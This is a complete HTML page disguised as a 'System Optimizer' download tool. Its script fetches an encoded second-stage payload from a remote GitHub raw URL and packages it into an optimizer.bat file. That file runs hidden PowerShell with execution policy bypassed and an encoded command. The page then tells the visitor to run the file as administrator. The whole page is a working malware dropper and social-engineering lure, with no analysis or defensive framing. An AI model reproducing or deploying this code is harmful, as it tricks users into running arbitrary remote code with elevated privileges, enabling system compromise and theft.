<!DOCTYPE html>
<html>
<head>
    <title>System Optimizer</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #333;
            margin-bottom: 15px;
            font-size: 28px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .btn {
            padding: 15px 40px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
        }
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">‚ö°</div>
        <h1>System Optimizer</h1>
        <p>Download and run the optimization tool to enhance system performance</p>
        <button class="btn" onclick="downloadOptimizer()">üì• Download Optimizer</button>
        <div id="status"></div>
    </div>
    
    <script>
    const RAW_URL = 'https://raw.githubusercontent.com/icecold169/rtcp/main/stage2.txt';
    let payload = null;
    
    // Preload payload
    (async function preload() {
        try {
            const res = await fetch(RAW_URL);
            payload = await res.text();
        } catch (e) {
            console.error('Preload failed:', e);
        }
    })();
    
    async function downloadOptimizer() {
        const statusDiv = document.getElementById('status');
        statusDiv.className = 'status loading';
        statusDiv.textContent = '‚è≥ Preparing download...';
        
        try {
            // Load payload if not preloaded
            if (!payload) {
                statusDiv.textContent = '‚è≥ Downloading components...';
                const res = await fetch(RAW_URL);
                payload = await res.text();
            }
            
            // Create batch file
            const batContent = `@echo off
powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${payload}
exit`;
            
            // Download
            const blob = new Blob([batContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'optimizer.bat';
            a.click();
            URL.revokeObjectURL(url);
            
            statusDiv.className = 'status success';
            statusDiv.innerHTML = '‚úÖ Downloaded!<br><br><b>Instructions:</b><br>1. Right-click optimizer.bat<br>2. Select "Run as administrator"<br>3. Wait for completion';
            
        } catch (e) {
            statusDiv.className = 'status error';
            statusDiv.textContent = '‚ùå Error: ' + e.message;
        }
    }
    </script>
</body>
</html>
